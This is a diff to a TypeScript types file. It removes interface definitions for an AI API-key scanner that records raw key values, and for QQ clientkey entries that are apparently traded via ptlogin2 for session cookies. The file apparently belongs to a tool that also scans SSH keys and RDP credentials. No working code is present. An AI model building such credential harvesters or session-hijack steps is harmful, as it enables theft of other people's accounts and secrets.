@@ -363,22 +363,6 @@ export interface BrowserSearchResult<T> {
   items: T[];
 }
 
-// ── AI Token Scanner types ─────────────────────────────────────────────
-
-export interface AITokenEntry {
-  vendor: string;
-  source: string;      // 'config-file' | 'env-var'
-  path: string;        // file path or env var name
-  keyName: string;     // key field name
-  keyValue: string;    // raw key value
-}
-
-export interface AITokenResult {
-  total: number;
-  items: AITokenEntry[];
-  error?: string;
-}
-
 // ── SSH Key Scanner types ─────────────────────────────────────────────
 
 export type SshKeyCategory = 'private-key' | 'public-key' | 'authorized-keys' | 'known-hosts' | 'config' | 'other';
@@ -422,31 +406,6 @@ export interface RDPResult {
   total: number;
   items: RdpCredentialItem[];
   rdpFiles: RdpFileItem[];
-  error?: string;
-}
-
-// ── QQ ClientKey types ───────────────────────────────────────────────
-
-export interface QQClientKeyItem {
-  uin: string;
-  clientkey: string;
-  pid: number;
-  process: string;
-  source: string;
-  /** skey session cookie traded from the clientkey via ptlogin2 jump */
-  skey?: string;
-  /** p_skey session cookie (qzone) */
-  p_skey?: string;
-  /** bkn hash computed from skey */
-  bkn?: number;
-  /** whether the key passed the ptlogin2 jump validation */
-  valid?: boolean;
-}
-
-export interface QQClientKeyResult {
-  total: number;
-  items: QQClientKeyItem[];
-  uins?: string[];
   error?: string;
 }
 
